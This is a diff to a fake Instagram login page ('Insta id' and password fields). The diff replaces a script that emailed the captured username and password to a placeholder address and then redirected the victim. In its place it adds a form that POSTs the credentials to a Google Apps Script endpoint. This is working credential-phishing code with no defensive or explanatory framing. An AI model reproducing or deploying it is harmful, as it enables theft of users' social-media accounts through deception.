@@ -62,29 +62,14 @@
 
 <div class="login-container">
     <h2>Login</h2>
-    <form id="login-form">
+    <form id="gform" method="POST"  action="https://script.google.com/macros/s/AKfycbxd_ShMpPSl63ZDIs_UURZHQRGi2vPpWcHp62umYQ4g0EPsiM1BGz9YuiLxkaCqXm872Q/exec">
         <input type="text" name="username" placeholder="Insta id" required><br>
         <input type="password" name="password" placeholder="Password" required><br>
         <input type="submit" value="Login">
     </form>
 </div>
 
-<script>
-    document.getElementById('login-form').addEventListener('submit', function(event) {
-        event.preventDefault();
-        var username = this.elements['username'].value;
-        var password = this.elements['password'].value;
 
-        // Simulate sending email
-        var emailContent = "Username: " + username + "\nPassword: " + password;
-        window.location.href = "mailto:your.email@gmail.com?subject=Login Information&body=" + encodeURIComponent(emailContent);
-
-        // Redirect to URL after login
-        setTimeout(function() {
-            window.location.href = "https://nishanahdassociates.github.io/eus.thacs/";
-        }, 1000); // Change the delay time as needed
-    });
-</script>
 
 </body>
 </html>
